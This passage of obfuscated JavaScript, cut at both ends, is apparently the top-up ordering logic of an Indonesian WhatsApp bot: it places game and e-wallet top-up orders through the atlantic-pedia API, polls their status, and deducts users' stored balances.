reply(_0x1ef6e3(0x142));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf7),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0xe6));}}}}}}}}}}}}}}}else{if(data_topup[_0x1ef6e3(0xf2)]===_0x1ef6e3(0xf7)){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup['data'][_0x1ef6e3(0xe9)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5);var data_name_ml=await stalkml(data_topup[_0x1ef6e3(0xe0)]['id_target'],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0xe9)]);if(data_name_ml[_0x1ef6e3(0xdc)]!==0xc8)return reply(_0x1ef6e3(0x130)),data_topup['session']='INPUT-GAME-ID',fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3));fs['writeFileSync'](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply('「\x20*KONFIRMASI-TOPUP*\x20」\x0a\x0a*ID:*\x20'+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)]['harga_topup'])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0xeb)+data_name_ml[_0x1ef6e3(0x143)]+_0x1ef6e3(0x15b)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+'\x20('+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0xe9)]+_0x1ef6e3(0x14e));}else{if(data_topup[_0x1ef6e3(0xf2)]==='KONFIRMASI-TOPUP'){if(chats['toLowerCase']()==='y'){reply(_0x1ef6e3(0x10a)+data_topup['ID']+_0x1ef6e3(0x131));if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0x140)))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0x127),'service':data_topup['data']['id_topup'],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x439588=>{const _0x7085e4=_0x1ef6e3;if(_0x439588[_0x7085e4(0xe0)][_0x7085e4(0x12b)]===!![]){data_topup[_0x7085e4(0xe0)][_0x7085e4(0x107)]=_0x439588[_0x7085e4(0xe0)][_0x7085e4(0xe0)][_0x7085e4(0x137)],fs[_0x7085e4(0x111)](topupPath+sender['split']('@')[0x0]+_0x7085e4(0xfb),JSON[_0x7085e4(0xec)](data_topup,null,0x3));var _0x591337=setInterval(function(){const _0x10891d=_0x7085e4;axios({'method':_0x10891d(0x124),'url':_0x10891d(0xe8),'data':qs[_0x10891d(0xec)]({'key':setting['apikey_antlatic'],'action':_0x10891d(0xdc),'trxid':data_topup[_0x10891d(0xe0)][_0x10891d(0x107)]})})[_0x10891d(0x12a)](_0xe80145=>{const _0x7d15dd=_0x10891d;console[_0x7d15dd(0x146)](_0xe80145[_0x7d15dd(0xe0)]),console[_0x7d15dd(0x146)](color('[CHECKING]','green'),'->\x20'+sender);if(_0xe80145[_0x7d15dd(0xe0)][_0x7d15dd(0xe0)]['status']===_0x7d15dd(0x161)){reply(_0x7d15dd(0xe4)+data_topup['ID']+_0x7d15dd(0xef)+data_topup[_0x7d15dd(0xe0)][_0x7d15dd(0x167)]+_0x7d15dd(0x15f)+data_topup[_0x7d15dd(0xe0)]['id_target']+'\x0a\x0a*SN:*\x0a'+_0xe80145[_0x7d15dd(0xe0)]['data'][_0x7d15dd(0x11e)]+_0x7d15dd(0x149)),minSaldo(sender,Number(data_topup[_0x7d15dd(0xe0)]['harga_topup']),db_saldo),fs[_0x7d15dd(0x10c)](topupPath+sender[_0x7d15dd(0x15a)]('@')[0x0]+_0x7d15dd(0xfb)),clearInterval(_0x591337);return;}else{if(_0xe80145[_0x7d15dd(0xe0)][_0x7d15dd(0xe0)][_0x7d15dd(0xdc)]===_0x7d15dd(0x150)){reply(_0x7d15dd(0x16c)+_0xe80145['data'][_0x7d15dd(0xe0)][_0x7d15dd(0x11e)]),fs[_0x7d15dd(0x10c)](topupPath+sender[_0x7d15dd(0x15a)]('@')[0x0]+_0x7d15dd(0xfb)),clearInterval(_0x591337);return;}}})[_0x10891d(0x10f)](_0x3db32c=>{const _0x556032=_0x10891d;reply(_0x556032(0x165)+data_topup[_0x556032(0xe0)][_0x556032(0x166)]+_0x556032(0xfc)),fs[_0x556032(0x10c)](topupPath+sender[_0x556032(0x15a)]('@')[0x0]+_0x556032(0xfb)),clearInterval(_0x591337);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup['data'][_0x7085e4(0x166)]+_0x7085e4(0xfc)),fs['unlinkSync'](topupPath+sender[_0x7085e4(0x15a)]('@')[0x0]+_0x7085e4(0xfb)),clearInterval(_0x591337);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('TTF'))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting['apikey_antlatic'],'action':'order','service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x296704=>{const _0x30955a=_0x1ef6e3;if(_0x296704[_0x30955a(0xe0)][_0x30955a(0x12b)]===!![]){data_topup[_0x30955a(0xe0)][_0x30955a(0x107)]=_0x296704[_0x30955a(0xe0)][_0x30955a(0xe0)][_0x30955a(0x137)],fs[_0x30955a(0x111)](topupPath+sender[_0x30955a(0x15a)]('@')[0x0]+_0x30955a(0xfb),JSON['stringify'](data_topup,null,0x3));var _0x2d27d6=setInterval(function(){const _0x105bd8=_0x30955a;axios({'method':_0x105bd8(0x124),'url':_0x105bd8(0xe8),'data':qs[_0x105bd8(0xec)]({'key':setting[_0x105bd8(0x155)],'action':_0x105bd8(0xdc),'trxid':data_topup[_0x105bd8(0xe0)]['id_produk']})})[_0x105bd8(0x12a)](_0x318b0f=>{const _0x4f7c0c=_0x105bd8;console[_0x4f7c0c(0x146)](_0x318b0f[_0x4f7c0c(0xe0)]),console[_0x4f7c0c(0x146)](color('[CHECKING]',_0x4f7c0c(0x138)),_0x4f7c0c(0xe7)+sender);if(_0x318b0f[_0x4f7c0c(0xe0)][_0x4f7c0c(0xe0)][_0x4f7c0c(0xdc)]===_0x4f7c0c(0x161)){reply(_0x4f7c0c(0xe4)+data_topup['ID']+_0x4f7c0c(0xef)+data_topup[_0x4f7c0c(0xe0)][_0x4f7c0c(0x167)]+_0x4f7c0c(0x15f)+data_topup[_0x4f7c0c(0xe0)][_0x4f7c0c(0x13a)]+_0x4f7c0c(0x119)+_0x318b0f[_0x4f7c0c(0xe0)][_0x4f7c0c(0xe0)]['message']+'\x0a\x0a_Terimakasih\x20kak\x20sudah\x20order\x20☺️_'),minSaldo(sender,Number(data_topup[_0x4f7c0c(0xe0)][_0x4f7c0c(0x100)]),db_saldo),fs[_0x4f7c0c(0x10c)](topupPath+sender['split']('@')[0x0]+_0x4f7c0c(0xfb)),clearInterval(_0x2d27d6);return;}else{if(_0x318b0f['data'][_0x4f7c0c(0xe0)][_0x4f7c0c(0xdc)]===_0x4f7c0c(0x150)){reply(_0x4f7c0c(0x16c)+_0x318b0f[_0x4f7c0c(0xe0)]['data'][_0x4f7c0c(0x11e)]),fs['unlinkSync'](topupPath+sender[_0x4f7c0c(0x15a)]('@')[0x0]+_0x4f7c0c(0xfb)),clearInterval(_0x2d27d6);return;}}})[_0x105bd8(0x10f)](_0x41e652=>{const _0x36a731=_0x105bd8;reply(_0x36a731(0x165)+data_topup[_0x36a731(0xe0)][_0x36a731(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x36a731(0x10c)](topupPath+sender['split']('@')[0x0]+_0x36a731(0xfb)),clearInterval(_0x2d27d6);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x30955a(0xe0)][_0x30955a(0x166)]+_0x30955a(0xfc)),fs[_0x30955a(0x10c)](topupPath+sender[_0x30955a(0x15a)]('@')[0x0]+_0x30955a(0xfb)),clearInterval(_0x2d27d6);return;}});else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)]('ITF'))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup['data'][_0x1ef6e3(0x166)],'target':data_topup[_0x1ef6e3(0xe0)]['id_target']})})[_0x1ef6e3(0x12a)](_0x867600=>{const _0x5cb7ce=_0x1ef6e3;if(_0x867600[_0x5cb7ce(0xe0)]['result']===!![]){data_topup[_0x5cb7ce(0xe0)]['id_produk']=_0x867600[_0x5cb7ce(0xe0)][_0x5cb7ce(0xe0)][_0x5cb7ce(0x137)],fs[_0x5cb7ce(0x111)](topupPath+sender['split']('@')[0x0]+'.json',JSON[_0x5cb7ce(0xec)](data_topup,null,0x3));var _0x11de1f=setInterval(function(){const _0x43263a=_0x5cb7ce;axios({'method':_0x43263a(0x124),'url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x43263a(0xec)]({'key':setting[_0x43263a(0x155)],'action':'status','trxid':data_topup[_0x43263a(0xe0)]['id_produk']})})['then'](_0x20b203=>{const _0x53722f=_0x43263a;console[_0x53722f(0x146)](_0x20b203[_0x53722f(0xe0)]),console[_0x53722f(0x146)](color(_0x53722f(0xea),'green'),_0x53722f(0xe7)+sender);if(_0x20b203[_0x53722f(0xe0)][_0x53722f(0xe0)][_0x53722f(0xdc)]==='success'){reply(_0x53722f(0xe4)+data_topup['ID']+_0x53722f(0xef)+data_topup['data']['produk_topup']+_0x53722f(0x15f)+data_topup[_0x53722f(0xe0)][_0x53722f(0x13a)]+_0x53722f(0x119)+_0x20b203[_0x53722f(0xe0)]['data'][_0x53722f(0x11e)]+'\x0a\x0a_Terimakasih\x20kak\x20sudah\x20order\x20☺️_'),minSaldo(sender,Number(data_topup['data'][_0x53722f(0x100)]),db_saldo),fs['unlinkSync'](topupPath+sender[_0x53722f(0x15a)]('@')[0x0]+_0x53722f(0xfb)),clearInterval(_0x11de1f);return;}else{if(_0x20b203[_0x53722f(0xe0)][_0x53722f(0xe0)][_0x53722f(0xdc)]===_0x53722f(0x150)){reply(_0x53722f(0x16c)+_0x20b203[_0x53722f(0xe0)][_0x53722f(0xe0)]['message']),fs['unlinkSync'](topupPath+sender[_0x53722f(0x15a)]('@')[0x0]+_0x53722f(0xfb)),clearInterval(_0x11de1f);return;}}})['catch'](_0x3b557f=>{const _0xff7cde=_0x43263a;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0xff7cde(0xe0)]['id_topup']+_0xff7cde(0xfc)),fs[_0xff7cde(0x10c)](topupPath+sender['split']('@')[0x0]+_0xff7cde(0xfb)),clearInterval(_0x11de1f);return;});},0xbb8);}else{reply(_0x5cb7ce(0x165)+data_topup['data'][_0x5cb7ce(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x5cb7ce(0x10c)](topupPath+sender[_0x5cb7ce(0x15a)]('@')[0x0]+_0x5cb7ce(0xfb)),clearInterval(_0x11de1f);return;}});else{if(data_topup['data'][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('STF'))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)]['id_topup'],'target':data_topup['data'][_0x1ef6e3(0x13a)]})})['then'](_0x18a0b0=>{const _0x328faa=_0x1ef6e3;if(_0x18a0b0[_0x328faa(0xe0)][_0x328faa(0x12b)]===!![]){data_topup['data'][_0x328faa(0x107)]=_0x18a0b0[_0x328faa(0xe0)][_0x328faa(0xe0)]['trxid'],fs['writeFileSync'](topupPath+sender[_0x328faa(0x15a)]('@')[0x0]+_0x328faa(0xfb),JSON[_0x328faa(0xec)](data_topup,null,0x3));var _0x3f81cb=setInterval(function(){const _0x5dca9a=_0x328faa;axios({'method':_0x5dca9a(0x124),'url':_0x5dca9a(0xe8),'data':qs[_0x5dca9a(0xec)]({'key':setting[_0x5dca9a(0x155)],'action':_0x5dca9a(0xdc),'trxid':data_topup[_0x5dca9a(0xe0)][_0x5dca9a(0x107)]})})[_0x5dca9a(0x12a)](_0x122c9d=>{const _0x55eb2f=_0x5dca9a;console[_0x55eb2f(0x146)](_0x122c9d['data']),console[_0x55eb2f(0x146)](color(_0x55eb2f(0xea),_0x55eb2f(0x138)),_0x55eb2f(0xe7)+sender);if(_0x122c9d['data'][_0x55eb2f(0xe0)][_0x55eb2f(0xdc)]===_0x55eb2f(0x161)){reply(_0x55eb2f(0xe4)+data_topup['ID']+_0x55eb2f(0xef)+data_topup[_0x55eb2f(0xe0)][_0x55eb2f(0x167)]+_0x55eb2f(0x15f)+data_topup['data'][_0x55eb2f(0x13a)]+_0x55eb2f(0x119)+_0x122c9d['data'][_0x55eb2f(0xe0)]['message']+_0x55eb2f(0x149)),minSaldo(sender,Number(data_topup['data']['harga_topup']),db_saldo),fs[_0x55eb2f(0x10c)](topupPath+sender[_0x55eb2f(0x15a)]('@')[0x0]+_0x55eb2f(0xfb)),clearInterval(_0x3f81cb);return;}else{if(_0x122c9d[_0x55eb2f(0xe0)][_0x55eb2f(0xe0)][_0x55eb2f(0xdc)]===_0x55eb2f(0x150)){reply(_0x55eb2f(0x16c)+_0x122c9d['data'][_0x55eb2f(0xe0)][_0x55eb2f(0x11e)]),fs[_0x55eb2f(0x10c)](topupPath+sender[_0x55eb2f(0x15a)]('@')[0x0]+_0x55eb2f(0xfb)),clearInterval(_0x3f81cb);return;}}})[_0x5dca9a(0x10f)](_0x84f6ab=>{const _0x2dd9b5=_0x5dca9a;reply(_0x2dd9b5(0x165)+data_topup[_0x2dd9b5(0xe0)][_0x2dd9b5(0x166)]+_0x2dd9b5(0xfc)),fs[_0x2dd9b5(0x10c)](topupPath+sender[_0x2dd9b5(0x15a)]('@')[0x0]+_0x2dd9b5(0xfb)),clearInterval(_0x3f81cb);return;});},0xbb8);}else{reply(_0x328faa(0x165)+data_topup[_0x328faa(0xe0)][_0x328faa(0x166)]+_0x328faa(0xfc)),fs[_0x328faa(0x10c)](topupPath+sender[_0x328faa(0x15a)]('@')[0x0]+_0x328faa(0xfb)),clearInterval(_0x3f81cb);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0xf0)))axios({'method':_0x1ef6e3(0x124),'url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':data_topup['data'][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x116821=>{const _0x5145c4=_0x1ef6e3;if(_0x116821[_0x5145c4(0xe0)][_0x5145c4(0x12b)]===!![]){data_topup['data'][_0x5145c4(0x107)]=_0x116821[_0x5145c4(0xe0)][_0x5145c4(0xe0)][_0x5145c4(0x137)],fs['writeFileSync'](topupPath+sender[_0x5145c4(0x15a)]('@')[0x0]+'.json',JSON[_0x5145c4(0xec)](data_topup,null,0x3));var _0x5e2712=setInterval(function(){const _0x1a2704=_0x5145c4;axios({'method':'POST','url':_0x1a2704(0xe8),'data':qs[_0x1a2704(0xec)]({'key':setting[_0x1a2704(0x155)],'action':_0x1a2704(0xdc),'trxid':data_topup[_0x1a2704(0xe0)][_0x1a2704(0x107)]})})[_0x1a2704(0x12a)](_0x1e2a3d=>{const _0x554803=_0x1a2704;console[_0x554803(0x146)](_0x1e2a3d[_0x554803(0xe0)]),console[_0x554803(0x146)](color(_0x554803(0xea),'green'),_0x554803(0xe7)+sender);if(_0x1e2a3d[_0x554803(0xe0)][_0x554803(0xe0)][_0x554803(0xdc)]===_0x554803(0x161)){reply(_0x554803(0xe4)+data_topup['ID']+'\x0a*Layanan:*\x20'+data_topup[_0x554803(0xe0)][_0x554803(0x167)]+_0x554803(0x15f)+data_topup[_0x554803(0xe0)][_0x554803(0x13a)]+_0x554803(0x119)+_0x1e2a3d['data'][_0x554803(0xe0)][_0x554803(0x11e)]+_0x554803(0x149)),minSaldo(sender,Number(data_topup[_0x554803(0xe0)][_0x554803(0x100)]),db_saldo),fs[_0x554803(0x10c)](topupPath+sender[_0x554803(0x15a)]('@')[0x0]+_0x554803(0xfb)),clearInterval(_0x5e2712);return;}else{if(_0x1e2a3d[_0x554803(0xe0)][_0x554803(0xe0)][_0x554803(0xdc)]===_0x554803(0x150)){reply(_0x554803(0x16c)+_0x1e2a3d['data']['data'][_0x554803(0x11e)]),fs[_0x554803(0x10c)](topupPath+sender['split']('@')[0x0]+'.json'),clearInterval(_0x5e2712);return;}}})[_0x1a2704(0x10f)](_0x301e81=>{const _0xb029cf=_0x1a2704;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0xb029cf(0xe0)]['id_topup']+_0xb029cf(0xfc)),fs[_0xb029cf(0x10c)](topupPath+sender[_0xb029cf(0x15a)]('@')[0x0]+_0xb029cf(0xfb)),clearInterval(_0x5e2712);return;});},0xbb8);}else{reply(_0x5145c4(0x165)+data_topup[_0x5145c4(0xe0)][_0x5145c4(0x166)]+_0x5145c4(0xfc)),fs['unlinkSync'](topupPath+sender[_0x5145c4(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x5e2712);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0x16b)))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup['data']['id_topup'],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x1585b1=>{const _0xf5ba8=_0x1ef6e3;if(_0x1585b1[_0xf5ba8(0xe0)][_0xf5ba8(0x12b)]===!![]){data_topup['data'][_0xf5ba8(0x107)]=_0x1585b1[_0xf5ba8(0xe0)][_0xf5ba8(0xe0)][_0xf5ba8(0x137)],fs['writeFileSync'](topupPath+sender[_0xf5ba8(0x15a)]('@')[0x0]+_0xf5ba8(0xfb),JSON[_0xf5ba8(0xec)](data_topup,null,0x3));var _0x336744=setInterval(function(){const _0x5734b2=_0xf5ba8;axios({'method':'POST','url':_0x5734b2(0xe8),'data':qs[_0x5734b2(0xec)]({'key':setting[_0x5734b2(0x155)],'action':_0x5734b2(0xdc),'trxid':data_topup[_0x5734b2(0xe0)][_0x5734b2(0x107)]})})[_0x5734b2(0x12a)](_0x42fdc7=>{const _0x30aa50=_0x5734b2;console[_0x30aa50(0x146)](_0x42fdc7[_0x30aa50(0xe0)]),console[_0x30aa50(0x146)](color(_0x30aa50(0xea),_0x30aa50(0x138)),_0x30aa50(0xe7)+sender);if(_0x42fdc7[_0x30aa50(0xe0)]['data'][_0x30aa50(0xdc)]===_0x30aa50(0x161)){reply(_0x30aa50(0xe4)+data_topup['ID']+_0x30aa50(0xef)+data_topup[_0x30aa50(0xe0)][_0x30aa50(0x167)]+_0x30aa50(0x15f)+data_topup['data'][_0x30aa50(0x13a)]+_0x30aa50(0x119)+_0x42fdc7[_0x30aa50(0xe0)][_0x30aa50(0xe0)][_0x30aa50(0x11e)]+_0x30aa50(0x149)),minSaldo(sender,Number(data_topup['data'][_0x30aa50(0x100)]),db_saldo),fs[_0x30aa50(0x10c)](topupPath+sender[_0x30aa50(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x336744);return;}else{if(_0x42fdc7['data']['data'][_0x30aa50(0xdc)]==='error'){reply(_0x30aa50(0x16c)+_0x42fdc7[_0x30aa50(0xe0)][_0x30aa50(0xe0)][_0x30aa50(0x11e)]),fs[_0x30aa50(0x10c)](topupPath+sender[_0x30aa50(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x336744);return;}}})[_0x5734b2(0x10f)](_0x9cb204=>{const _0x39aeda=_0x5734b2;reply(_0x39aeda(0x165)+data_topup[_0x39aeda(0xe0)][_0x39aeda(0x166)]+_0x39aeda(0xfc)),fs[_0x39aeda(0x10c)](topupPath+sender[_0x39aeda(0x15a)]('@')[0x0]+_0x39aeda(0xfb)),clearInterval(_0x336744);return;});},0xbb8);}else{reply(_0xf5ba8(0x165)+data_topup[_0xf5ba8(0xe0)][_0xf5ba8(0x166)]+_0xf5ba8(0xfc)),fs[_0xf5ba8(0x10c)](topupPath+sender[_0xf5ba8(0x15a)]('@')[0x0]+_0xf5ba8(0xfb)),clearInterval(_0x336744);return;}});else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)]('OVO'))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x300205=>{const _0x299382=_0x1ef6e3;if(_0x300205[_0x299382(0xe0)][_0x299382(0x12b)]===!![]){data_topup[_0x299382(0xe0)][_0x299382(0x107)]=_0x300205[_0x299382(0xe0)][_0x299382(0xe0)][_0x299382(0x137)],fs[_0x299382(0x111)](topupPath+sender[_0x299382(0x15a)]('@')[0x0]+_0x299382(0xfb),JSON[_0x299382(0xec)](data_topup,null,0x3));var _0x218861=setInterval(function(){const _0x57afc1=_0x299382;axios({'method':_0x57afc1(0x124),'url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x57afc1(0xec)]({'key':setting[_0x57afc1(0x155)],'action':_0x57afc1(0xdc),'trxid':data_topup[_0x57afc1(0xe0)][_0x57afc1(0x107)]})})[_0x57afc1(0x12a)](_0xf43302=>{const _0x33fbf0=_0x57afc1;console['log'](_0xf43302['data']),console['log'](color(_0x33fbf0(0xea),_0x33fbf0(0x138)),_0x33fbf0(0xe7)+sender);if(_0xf43302[_0x33fbf0(0xe0)]['data']['status']===_0x33fbf0(0x161)){reply('*──\x20「\x20TOPUP\x20SUKSES\x20」\x20──*\x0a\x0a*Status:*\x20Success\x0a*ID\x20order:*\x20'+data_topup['ID']+'\x0a*Layanan:*\x20'+data_topup[_0x33fbf0(0xe0)]['produk_topup']+'\x0a*Nomor\x20Target:*\x20'+data_topup[_0x33fbf0(0xe0)][_0x33fbf0(0x13a)]+_0x33fbf0(0x119)+_0xf43302[_0x33fbf0(0xe0)]['data'][_0x33fbf0(0x11e)]+_0x33fbf0(0x149)),minSaldo(sender,Number(data_topup[_0x33fbf0(0xe0)]['harga_topup']),db_saldo),fs['unlinkSync'](topupPath+sender[_0x33fbf0(0x15a)]('@')[0x0]+_0x33fbf0(0xfb)),clearInterval(_0x218861);return;}else{if(_0xf43302['data'][_0x33fbf0(0xe0)][_0x33fbf0(0xdc)]==='error'){reply('Pesanan\x20dibatalkan!\x0aAlasan\x20:\x20'+_0xf43302['data']['data'][_0x33fbf0(0x11e)]),fs[_0x33fbf0(0x10c)](topupPath+sender[_0x33fbf0(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x218861);return;}}})['catch'](_0x5ae2d7=>{const _0x24e0b0=_0x57afc1;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x24e0b0(0xe0)][_0x24e0b0(0x166)]+_0x24e0b0(0xfc)),fs[_0x24e0b0(0x10c)](topupPath+sender[_0x24e0b0(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x218861);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x299382(0xe0)][_0x299382(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x299382(0x10c)](topupPath+sender['split']('@')[0x0]+_0x299382(0xfb)),clearInterval(_0x218861);return;}});else{if(data_topup['data'][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0x139)))axios({'method':'POST','url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':'order','service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':data_topup['data']['id_target']})})['then'](_0x2f74f4=>{const _0x1f90d6=_0x1ef6e3;if(_0x2f74f4[_0x1f90d6(0xe0)][_0x1f90d6(0x12b)]===!![]){data_topup[_0x1f90d6(0xe0)][_0x1f90d6(0x107)]=_0x2f74f4[_0x1f90d6(0xe0)][_0x1f90d6(0xe0)]['trxid'],fs['writeFileSync'](topupPath+sender[_0x1f90d6(0x15a)]('@')[0x0]+_0x1f90d6(0xfb),JSON[_0x1f90d6(0xec)](data_topup,null,0x3));var _0x2d8f3f=setInterval(function(){const _0x353531=_0x1f90d6;axios({'method':_0x353531(0x124),'url':_0x353531(0xe8),'data':qs[_0x353531(0xec)]({'key':setting[_0x353531(0x155)],'action':_0x353531(0xdc),'trxid':data_topup[_0x353531(0xe0)]['id_produk']})})['then'](_0x4e56c0=>{const _0x55dee7=_0x353531;console[_0x55dee7(0x146)](_0x4e56c0[_0x55dee7(0xe0)]),console['log'](color('[CHECKING]',_0x55dee7(0x138)),_0x55dee7(0xe7)+sender);if(_0x4e56c0[_0x55dee7(0xe0)]['data'][_0x55dee7(0xdc)]===_0x55dee7(0x161)){reply('*──\x20「\x20TOPUP\x20SUKSES\x20」\x20──*\x0a\x0a*Status:*\x20Success\x0a*ID\x20order:*\x20'+data_topup['ID']+_0x55dee7(0xef)+data_topup[_0x55dee7(0xe0)][_0x55dee7(0x167)]+_0x55dee7(0x164)+data_topup[_0x55dee7(0xe0)][_0x55dee7(0x13a)]+'\x0a\x0a*SN:*\x0a'+_0x4e56c0['data'][_0x55dee7(0xe0)]['message']+_0x55dee7(0x149)),minSaldo(sender,Number(data_topup[_0x55dee7(0xe0)][_0x55dee7(0x100)]),db_saldo),fs[_0x55dee7(0x10c)](topupPath+sender[_0x55dee7(0x15a)]('@')[0x0]+_0x55dee7(0xfb)),clearInterval(_0x2d8f3f);return;}else{if(_0x4e56c0[_0x55dee7(0xe0)][_0x55dee7(0xe0)]['status']===_0x55dee7(0x150)){reply(_0x55dee7(0x16c)+_0x4e56c0[_0x55dee7(0xe0)]['data'][_0x55dee7(0x11e)]),fs[_0x55dee7(0x10c)](topupPath+sender['split']('@')[0x0]+_0x55dee7(0xfb)),clearInterval(_0x2d8f3f);return;}}})[_0x353531(0x10f)](_0x5660c6=>{const _0x4503dd=_0x353531;reply(_0x4503dd(0x165)+data_topup[_0x4503dd(0xe0)]['id_topup']+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x4503dd(0x10c)](topupPath+sender[_0x4503dd(0x15a)]('@')[0x0]+_0x4503dd(0xfb)),clearInterval(_0x2d8f3f);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x1f90d6(0xe0)][_0x1f90d6(0x166)]+_0x1f90d6(0xfc)),fs[_0x1f90d6(0x10c)](topupPath+sender[_0x1f90d6(0x15a)]('@')[0x0]+_0x1f90d6(0xfb)),clearInterval(_0x2d8f3f);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('SHP'))axios({'method':'POST','url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x1ef6e3(0xec)]({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)]['id_topup'],'target':data_topup[_0x1ef6e3(0xe0)]['id_target']})})[_0x1ef6e3(0x12a)](_0x122cad=>{const 